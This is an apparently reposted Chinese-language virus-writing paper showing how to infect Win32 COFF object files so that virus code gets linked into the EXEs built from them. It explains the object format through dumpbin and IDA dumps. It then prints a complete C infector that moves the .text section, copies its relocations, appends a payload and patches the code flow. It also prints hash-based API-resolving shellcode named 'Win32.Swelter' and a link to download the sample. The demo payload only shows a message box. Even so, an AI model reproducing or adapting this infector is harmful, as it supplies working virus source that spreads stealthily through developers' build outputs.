@@ -1,0 +1,756 @@
+
+# Win32 平台下感染 coff-obj 文件方法
+
+> 原文：[`www.pediy.com/kssd/pediy12/128155.html`](https://www.pediy.com/kssd/pediy12/128155.html)
+
+这是早些时候提交给 Ph4nt0m Webzine 0x05 的 paper，现在已经发布了，仅供有这方面研究的朋友参考。感染 obj 可以有很多办法，这个只是最简单的一个。
+
+## \[0x01\] .简介
+
+本文介绍了如何感染 win32 平台的 `coff-obj` 格式的文件。在没有 `rebuild all` 情况下，被感染的 `coff-obj` 文件将被链接器从新合并到新文件当中，病毒代码也就将寄宿于产生的 `EXE` 文件中。
+
+## \[0x02\] .感染思路
+
+可感染 obj 文件的病毒非常少，主要集中在感染 DOS 时期的 com 文件，最早的感染 obj 文件的病毒是 Stormbringer 在 1993 年编写的 `shifter`。charme 的 blog 上有关于这个的详细分析《感染 OBJ 文件》。在 win32 平台下貌似还没看到有感染 `coff-obj` 格式的病毒，下面将演示如何去感染 `coff-obj` 文件的实现思路。
+
+主要的想法，还是要获得 `coff-obj` 文件中代码执行的控制流程，但受 `coff-obj` 格式限制，使得感染方式不可能像 `PE` 文件那样灵活。但仍然可以用很多思路来突破感染这些瓶颈。
+
+| PE 文件的主要感染思路 | `coff-obj` |
+| :--- | :--- |
+| 1 感染文件头 | 头部无可操作空间 |
+| 2 修改 `EOP` | 没有 `EOP` 的概念 |
+| 3 添加新节 | 可以尝试 |
+| 4 `EPO`（入口模糊） | 可以尝试 |
+| 5 hook 导入表 | 可以尝试 |
+| 6 `PE` 捆绑 | 链接器执行会出问题 |
+| 7 ... | ... |
+
+这里采用比较稳妥的方式来获得控制流程，就是重新构造一个 `cof-obj` 格式的 `.text` 段来获得控制流程，下面先看一下 `coff-obj` 的文件格式。
+
+## \[0x03\] .coff-obj 格式
+
+`coff-obj` 文件格式比较清晰，由文件头+可选头+段+数据+重定位+符号组成。对 obj 文件来说是没有可选头的概念的，所以后面提到的 `coff-obj` 专指生成的目标文件格式，简称 `obj`，下面是要构造一个新的 `.text` 段的示意图，实际段的排列和重定位的数据是混合的，此处仅是为了方便描述，简化处理了。
+
+```text
++--------------+
+| FILEHDR      |
++--------------+
+| SECHDR1      |  -----------\假设此处是原.text 段，修改节数据使它指向新的添加数据
++--------------+             |
+| SECHDR2      |             |
++--------------+             |
+| ...          |             |
++--------------+             |
+|  SECHDR N    |             |
++--------------+             |
+|  SECDATE     |             |
++--------------+             |
+|  LINE        |             |
++--------------+             |
+|  Symbol      |             | 
++--------------+             |
+|  String      |             |
++--------------+             |
+| new data     | <----------.  
++--------------+  
+```
+
+下面使用一个简单的 c 程序 `t_obj` 来详细说明 obj 格式。
+
+```c
+//----------------------------------------------------------------------
+  #include <stdio.h>
+  int main()
+  {
+    char *title = "hello world!";
+    printf(title);
+  }
+//----------------------------------------------------------------------
+```
+
+`cmd > dumpbin /all /disasm t_obj.obj`
+
+截取主要部分打印数据：
+
+```text
+//-------------------------------- 文件头 ------------------------------
+FILE HEADER VALUES
+  14C machine (i386)
+    4 number of sections *** 重要的结构，这告诉我们这个 obj 文件有几个段，而我们关心的就是.text 段
+ 4C6DF71D time date stamp   
+  125 file pointer to symbol table
+   10 number of symbols
+    0 size of optional header
+    0 characteristics
+
+//-------------------------------- .drectve 段 -----------------------------
+//----该段在 obj 文件被 link 过程中会被舍弃掉，主要提供给 link 的命令参数-------
+SECTION HEADER #1
+.drectve name
+    0 physical address
+    0 virtual address
+   26 size of raw data
+   B4 file pointer to raw data
+    0 file pointer to relocation table
+    0 file pointer to line numbers
+    0 number of relocations
+    0 number of line numbers
+ 100A00 flags
+       Info
+       Remove
+       1 byte align
+
+RAW DATA #1
+ 00000000: 2D 65 66 61 75 6C 74 6C 69 62 3A 4C 49 42 43   -defaultlib:LIBC
+ 00000010: 20 2D 64 65 66 61 75 6C 74 6C 69 62 3A 4F 4C 44   -defaultlib:OLD
+ 00000020: 4E 41 4D 45 53 20                              NAMES 
+
+  Linker Directives
+  -----------------
+  -defaultlib:LIBC
+  -defaultlib:OLDNAMES
+
+//-------------------------------- .text 段 -----------------------------
+SECTION HEADER #2
+  .text name
+    0 physical address
+    0 virtual address
+   10 size of raw data                   -----> 段长度，也就是实际编码长度
+  DA file pointer to raw data           -----> .text 中代码，相对文件头部的偏移
+  EA file pointer to relocation table   -----> 指向.text 中需要重定位的数据指针
+    0 file pointer to line numbers
+    2 number of relocations             -----> .text 中代码，需要被修正的重定位数量
+    0 number of line numbers
+ 60501020 flags
+       Code
+       Communal; sym= _main
+       16 byte align
+       Execute Read
+
+_main:
+ 00000000: 68 00 00 00 00     push    offset _main   ---->此处偏移是 0x00000000，还没有被重定位
+ 00000005: E8 00 00 00 00     call    0000000A       ---->此处偏移是 0x00000000，还没有被重定位
+ 0000000A: 59                 pop     ecx
+ 0000000B: C3                 ret
+ 0000000C: 90                 nop
+ 0000000D: 90                 nop
+ 0000000E: 90                 nop
+ 0000000F: 90                 nop
+
+RAW DATA #2
+ 00000000: 68 00 00 00 00 E8 00 00 00 00 59 C3 90 90 90 90  h.........Y.....
+
+  具体 0x68，0xe8 后面的值需要由编译器来绝对。
+//--------------------- .text 段中的被修正的重定位表 --------------------
+//最终代码就是根据该表中的值给链接器提供信息做最后的重定位依据
+RELOCATIONS #2
+                                               Symbol    Symbol
+ Offset    Type            Applied To           Index     Name
+ --------  ----------------  -----------------  --------  ------
+ 00000001  DIR32                 00000000          D  ??_C@_0N@NHHG@hello?5world?$CB?$AA@ (`string")
+ 00000006  REL32                 00000000          A  _printf
+
+  这里说一下，重定位的类型有 3 类：
+DIR32    ---> 直接重定位，多是字符串一类情况，需要有链接器最终定位具体的虚拟地址值
+REL32    ---> 相对重定位，当前 opcode，相对于要跳转的函数的相对偏移值
+DIR32NB  ---> 供调试信息使用，与 DIR32 的区别是重定位值不包含可执行文件的默认加载地址
+
+  00000001，00000006 表示相对.text 代码处要修正的位置偏移，也就是[]括起来的部分
+00000000: 68 [00] 00 00 00     push        offset _main     
+00000005: E8 [00] 00 00 00     call        0000000A     
+//-------------------------------- .data 段 -----------------------------
+SECTION HEADER #3
+  .data name
+    0 physical address
+    0 virtual address
+    D size of raw data
+  FE file pointer to raw data
+    0 file pointer to relocation table
+    0 file pointer to line numbers
+    0 number of relocations
+    0 number of line numbers
+C0301040 flags
+       Initialized Data
+       Communal; sym= "`string"" (??_C@_0N@NHHG@hello?5world?$CB?$AA@)
+       4 byte align
+       Read Write
+
+RAW DATA #3
+ 00000000: 68 65 6C 6C 6F 20 77 6F 72 6C 64 21 00            hello world!. 
+
+  数据的位置最后由链接器来定义。
+//------------------------------------------------------------------------------
+```
+
+下面看一下 `t_obj.obj` 在 IDA 中的显示情况:
+
+```text
+.text:00000000               public _main
+.text:00000000               _main               proc near
+.text:00000000 68 10 00 00 00   push    offset ??_C@_0N@NHHG@hello?5world?$CB?$AA@ ; "hello world!"
+.text:00000005 E8 16 00 00 00   call    _printf
+.text:0000000A 59                   pop     ecx
+.text:0000000B C3                   retn
+.text:0000000B               _main               endp
+```
+
+IDA 根据重定位表的格式，对 `.text` 段分别修正为 `0x10` ，`0x16` 两个偏移。同时当你增加 `.text` coe 大小时，链接器会自动调整 `.data` 的位置。
+
+```text
+//------------------------------------------------------------------------------
+```
+
+最终生成的 `t_obj.EXE` 文件显示情况
+
+```assembly
+00401000   /$  68 30704000     push t_obj.00407030  ;  ASCII "hello world!"
+00401005   |.  E8 06000000     call t_obj.00401010
+0040100A   |.  59             pop ecx
+0040100B   \.  C3             retn
+```
+
+字符串 `"hello world!"` 被定位到了 `0x00407030`
+
+`print` 函数被定位到相对偏移 `0x05` + `0x6` = `0x0b` 的位置，也即是虚拟地址为 `401010`
+
+此时我们知道，如果要修改 obj 文件的 `.text` 代码是要注意的，要避免修改到重定位的部分，否则你的代码也会被链接器改写。
+
+## \[0x04\] .修改宿主数据
+
+1. 修改 `.text` 结构使其指向新加入的病毒代码位置，下面是段的结构体类型：
+
+```c
+typedef struct _sec_hdr
+{ 
+  char c_name[8];           // 段名  
+```
+
+
+
+# COFF 结构体定义
+
+```c
+unsigned long  ul_v_size;    // 虚拟大小  
+unsigned long  ul_v_addr;    // 虚拟地址  
+unsigned long  ul_sec_size;  // 段长度  
+unsigned long  ul_sec_off;   // 段数据偏移  
+unsigned long  ul_rel_off;   // 段重定位表偏移  
+unsigned long  ul_lno_off;   // 行号表偏移  
+unsigned short ul_num_rel;   // 重定位表个数  
+unsigned short ul_num_ln;    // 行号表长度  
+unsigned long  ul_flags;     // 段标识  
+}sec_hdr;
+```
+
+# 字段修改说明
+
+- `ul_sec_size` --> 修改为原代码的长度+病毒代码长度+重定位表长度
+- `ul_sec_off` --> 指向文件末尾
+
+# 问题分析
+
+在分析中发现一个问题，如果把原 `.text` 的代码拷贝到新的空间中而不拷贝重定位数据，会导致链接器无法执行。生成的 `EXE` 文件也无法执行，因为那部分数据被病毒代码填充，链接器无法解析。
+
+虽然 `.text` 的代码部分长度并不包括重定位部分长度，且包括指向段内重定位表偏移的指针，链接器可以根据原有那个表进行重定位操作，但实际情况是，链接器会因为你的修改，把原有数据重定位弄错误，在 `IDA` 中观察是没有问题的，但最终生成的 `EXE` 文件是完全混乱的。
+
+所以我的一个猜测是段结构中的重定位偏移仅是提供给外部程序解析参考用的（如 `IDA`，`dumpbin`），而链接器只接受默认 `.text` 后面就是重定位表的事实。所以为了能执行成功，我们还是把重定位部分拷贝过去，所以我们新增数据的长度是以上 3 部分的长度总和。
+
+# 修改原有代码
+
+修改原有代码，使其跳向病毒代码。
+
+```asm
+_main:
+00000000: 68 00 00 00 00     push        offset _main
+00000005: E8 00 00 00 00     call        0000000A
+0000000A: 59                 pop         ecx
+0000000B: C3                 ret  ----------------\        
+0000000C: 90                 nop         |
+0000000D: 90                 nop         |
+0000000E: 90                 nop         |
+0000000F: 90                 nop         |
+... 注意此处是重定位表的数据，要跳过该部分长度   |                            |
+                                                 |
+000000xx: nop <---------------------------------/
+000000xx: nop
+000000xx: nop
+...virus code
+```
+
+# 返回原代码部分
+
+简单的情况，可直接在病毒代码中 `ret` 返回即可，宿主情况复杂的话，需要计算好偏移重新跳回去。
+
+# 感染后的情况
+
+```
+SECTION HEADER #2
+ .text name
+     0 physical address
+     0 virtual address
+    D9 size of raw data                    ----> 长度已经被重新计算
+   26D file pointer to raw data           ----> 指向了文件末尾
+    EA file pointer to relocation table   ----> 没有修改原有重定位表
+     0 file pointer to line numbers
+     2 number of relocations
+     0 number of line numbers
+60501020 flags
+        Code
+        Communal; sym= _main
+        16 byte align
+        Execute Read
+```
+
+```asm
+_main:
+00000000: 68 00 00 00 00     push        offset _main
+00000005: E8 00 00 00 00     call        0000000A
+0000000A: 59                 pop         ecx
+0000000B: EB 1C              jmp         00000029  -------------------\
+0000000D: 00 00              add         byte ptr [eax],al            |
+0000000F: 00 01              add         byte ptr [ecx],al            |
+00000011: 00 00              add         byte ptr [eax],al            |
+00000013: 00 0D 00 00 00 06  add         byte ptr ds:[6000000h],cl    |
+00000019: 00 06              add         byte ptr [esi],al            |
+0000001B: 00 00              add         byte ptr [eax],al            |  
+0000001D: 00 0A              add         byte ptr [edx],cl            |
+0000001F: 00 00              add         byte ptr [eax],al            |
+00000021: 00 14 00           add         byte ptr [eax+eax],dl        |
+00000024: 68 65 6C 6C 90     push        906C6C65h                    |
+00000029: 90                 nop    <----------------------------------/    跳向了我们想要执行的代码            
+0000002A: 90                 nop
+0000002B: 90                 nop
+0000002C: 90                 nop
+0000002D: 90                 nop
+0000002E: 90                 nop
+0000002F: 90                 nop
+00000030: 90                 nop
+00000031: FC                 cld
+00000032: 68 6A 0A 38 1E     push        1E380A6Ah
+00000037: 68 63 89 D1 4F     push        4FD18963h
+0000003C: 68 32 74 91 0C     push        0C917432h
+00000041: 8B F4              mov         esi,esp
+00000043: 8D 7E F4           lea         edi,[esi-0Ch]
+...
+```
+
+# 代码演示
+
+代码演示的部分仅弹出一个 `MessageBox`，我比较懒，所以偷懒用 `failwest` 的一个 `shellcode_popup_general` 代码（thx ^_^）稍作修改。
+
+```c
+//------------------------------------------------------------------------------
+#include <stdio.h>
+#include <string.h>
+#include <malloc.h>
+
+void vir_code(void);
+void vir_code_end(void);
+
+int main(int argc, char* argv[])
+{   
+  FILE           *h = 0;  
+  unsigned char *buf = 0;
+  int         numread = 0;
+  int           i = 0;
+  int     f_size = 0;
+  int     vir_size = 0;
+  int     a_size = 0;
+  int     tx_off = 0;
+  // coff-obj 文件头结构  
+  typedef struct _coff_obj_header
+  {
+    short int magic;
+    short int sections;
+    long      t_stamp;
+    long      symbol_to_pointer;
+    long      symbol_to_number;
+    short int optional_header;
+    short int ****s;
+  }coff_obj_header;
+  
+  typedef struct _sec_hdr
+  { 
+    char c_name[8];             // 段名  
+    unsigned long  ul_v_size;    // 虚拟大小  
+    unsigned long  ul_v_addr;    // 虚拟地址  
+    unsigned long  ul_sec_size;  // 段长度  
+    unsigned long  ul_sec_off;   // 段数据偏移  
+    unsigned long  ul_rel_off;   // 段重定位表偏移  
+    unsigned long  ul_lno_off;   // 行号表偏移  
+    unsigned short ul_num_rel;   // 重定位表个数
+    unsigned short ul_num_ln;    // 行号表长度  
+    unsigned long  ul_flags;     // 段标识  
+  }sec_hdr;
+  
+  typedef struct _reloc_s
+  {
+    unsigned long  ul_off;        // 定位偏移  
+    unsigned long  ul_symbol;     // 符号
+    unsigned short us_type;       // 定位类型
+  }reloc_s;
+  
+  coff_obj_header coh_buf;
+  sec_hdr            sh;
+  long         tx_rel_off;        
+  long         tx_rel_len;       
+  long         txt_len;          
+  long         txt_off;
+  
+  if (argc <2)
+  {
+    printf("please enter the obj file path to infection\n");
+    return 0;
+  }
+  
+  if (0 == (h = fopen(argv[1],"r+")))
+  {
+    printf("the file %s was not opened\n",argv[2]);
+    return 0;
+  }
+  
+  fseek(h,0,SEEK_END); 
+  f_size = ftell(h);
+  fseek(h,0,SEEK_SET);
+  
+  numread  = fread(&coh_buf,sizeof (coff_obj_header),1,h);
+  
+  for(i = 0 ; i < coh_buf.sections;i++)
+  {
+    fread(&sh,sizeof(sec_hdr),1,h);
+    if (0 == strnicmp(".text",sh.c_name,5))
+    {
+      tx_off  = sizeof(coff_obj_header) + i * sizeof(sec_hdr);
+      txt_off = sh.ul_sec_off;
+      txt_len = sh.ul_sec_size;
+      //读取重定位表数据
+      tx_rel_off = sh.ul_rel_off;
+      tx_rel_len = sh.ul_num_rel * sizeof(reloc_s);   
+      break;
+    }
+  }
+  
+  // 构造一个新的 obj 缓冲区 
+  vir_size = (int)((int)&vir_code_end - (int)&vir_code);
+  a_size   = f_size + vir_size + tx_rel_len + 1;
+  buf      = (unsigned char *)malloc(a_size);
+  memset(buf,0,f_size + vir_size +1);
+  
+  fseek(h,0,SEEK_SET);
+  fread(buf,sizeof(unsigned char),f_size,h);
+  fclose(h);   
+  h = 0;
+  
+  // 修改 text 节的执行   
+  // 将原有.text 数据定位的文件尾部
+  printf("buff + f_size :%0x\n",buf + f_size);
+  memcpy(buf + f_size,buf + txt_off,txt_len);
+  
+  // copy 重定位表
+  memcpy(buf + f_size + txt_len,buf + tx_rel_off,tx_rel_len);
+  
+  // copy virus
+  memcpy(buf + f_size + txt_len + tx_rel_len,vir_code,vir_size);
+  
+  // 修改.text 节代码偏移
+  //sh.ul_sec_size
+  (*(unsigned long *)(buf + tx_off + 8 + 4 + 4))     = txt_len + vir_size + 9;
+  
+  //sh.ul_sec_off
+  (*(unsigned long *)(buf + tx_off + 8 + 4 + 4 + 4)) = f_size;
+  
+  // 修改原有 ret 指令，跳过重定位表，此处需要反汇编引擎支持，搜索 0xc3，定位要修改的 jmp 位置，POC 演示直接定位.
+  (*(unsigned char *)(buf + f_size + 0x0b)) = 0xeb;
+  (*(unsigned long *)(buf + f_size + 0x0c)) = (txt_len - 0xc) + tx_rel_len - 1;
+  
+  // 加入 ret 指令返回，或跳转会宿主
+  // ...
+  
+  // 写入一个新的 obj   
+  if(0 ==(h = fopen("t_obj.obj","wb")))
+  {
+```
+
+
+
+```c
+printf("the file t_obj.obj was not created\n");  
+
+return 0;  
+
+}  
+
+fwrite(buf,sizeof(unsigned char),a_size,h);  
+
+fclose(h);  
+
+return 1;  
+
+}  
+```
+
+```c
+__declspec(naked) void vir_code(void)  
+
+{  
+
+  _asm{   
+
+
+      nop  
+
+      nop  
+
+      nop  
+
+      nop  
+
+      nop  
+
+      nop  
+
+      nop  
+
+      nop  
+
+      nop  
+
+      CLD               ; clear flag DF  
+
+                     ;store hash  
+
+      push 0x1e380a6a   ;hash of MessageBoxA  
+
+      push 0x4fd18963   ;hash of ExitProcess  
+
+      push 0x0c917432   ;hash of LoadLibraryA  
+
+      mov esi,esp       ; esi = addr of first function hash  
+
+      lea edi,[esi-0xc] ; edi = addr to start writing function  
+
+      ; make some stack space  
+
+      xor ebx,ebx  
+
+      mov bh, 0x04         
+
+
+      sub esp, ebx       
+
+
+                     ; push a pointer to "user32" onto stack  
+
+      mov bx, 0x3233    ; rest of ebx is null  
+
+      push ebx  
+
+      push 0x72657375  
+
+      push esp  
+
+      xor edx,edx  
+
+      ; find base addr of kernel32.dll  
+
+      mov ebx, fs:[edx + 0x30]   
+
+      mov ecx, [ebx + 0x0c]     
+
+      mov ecx, [ecx + 0x1c]       
+
+
+      mov ecx, [ecx]             
+
+
+      mov ebp, [ecx + 0x08]       
+
+
+    find_lib_functions:  
+
+      lodsd                   
+
+
+      cmp eax, 0x1e380a6a         
+
+
+      jne find_functions  
+
+      xchg eax, ebp             
+
+
+      call [edi - 0x8]           
+
+
+      xchg eax, ebp             
+
+
+    find_functions:  
+
+      pushad                   
+
+
+      mov eax, [ebp + 0x3c]       
+
+
+      mov ecx, [ebp + eax + 0x78]    
+
+
+      add ecx, ebp              
+
+
+      mov ebx, [ecx + 0x20]     
+
+
+      add ebx, ebp             
+
+
+      xor edi, edi             
+
+
+    next_function_loop:  
+
+      inc edi                  
+
+
+      mov esi, [ebx + edi * 4]     
+
+
+      add esi, ebp             
+
+
+      cdq                     
+
+
+    hash_loop:  
+
+      movsx eax, byte ptr[esi]  
+
+      cmp al,ah  
+
+      jz compare_hash  
+
+      ror edx,7  
+
+      add edx,eax  
+
+      inc esi  
+
+      jmp hash_loop  
+
+    compare_hash:   
+
+
+      cmp edx, [esp + 0x1c]       
+
+
+      jnz next_function_loop  
+
+      mov ebx, [ecx + 0x24]       
+
+
+      add ebx, ebp              
+
+
+      mov di, [ebx + 2 * edi]     
+
+
+      mov ebx, [ecx + 0x1c]       
+
+
+      add ebx, ebp              
+
+
+      add ebp, [ebx + 4 * edi]   
+
+      xchg eax, ebp             
+
+
+      pop edi               
+
+
+      stosd               
+
+
+      push edi  
+
+      popad                   
+
+
+      cmp eax,0x1e380a6a  
+
+      jne find_lib_functions  
+
+    function_call:  
+
+      xor ebx,ebx  
+
+      push ebx               // cut string  
+
+      push 0x00726574        // show Win32.Swelter  
+
+      push 0x6C657753     
+
+
+      mov eax,esp           //load address of Swelter  
+
+      push ebx   
+
+
+      push eax  
+
+      push eax  
+
+      push ebx  
+
+      call [edi - 0x04]     //call MessageboxA  
+
+      push ebx  
+
+      call [edi - 0x08]     // call ExitProcess  
+
+      ret       
+
+
+  }  
+
+}  
+```
+
+```c
+__declspec(naked) void vir_code_end(void)  
+
+{  
+
+}  
+```
+
+///
+
+### 0. 其它
+
+关于感染的方式还有很多种方法，比如利用重定位表，构造一个加载后能跳转到 `virus code` 值，感兴趣的朋友可以去尝试下，`coff - obj` 的感染条件比较苛刻，至少要在有编译器的机器上搜索到有 `obj` 才行，并且没有做 `rebuild all` 操作，而是直接编译链接代码，这样才会神不知鬼不觉的把病毒代码编译进自己的工程里面来。
+
+由于对链接器原理理解不够深入及对 `coff` 文件格式本身理解不准的地方可能导致本文存在描述中存在疏漏，如果有什么问题给 mail 我，`neineit@gmail.com`，欢迎交流指正。
+
+#### 附参考文献：
+
+[1] Matt Pietrek.    《Linker Algorithm》  
+
+[2] John R. Levine.  《Linkers & Loaders》  
+
+[3] `coff` 格式.        `http://baike.baidu.com/view/1240794.htm`  
+
+[4] `failwest`.        《`shellcode_popup_general`》
+
+#### 演示例子下载：
+
+见附件，或用 `vxjump` 提供的链接
+
+`http://www.vxjump.net/downfile/Win32.Swelter.rar`
+
+上传的附件
+
+| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) || `Win32.Swelter.rar`  
+
+ |
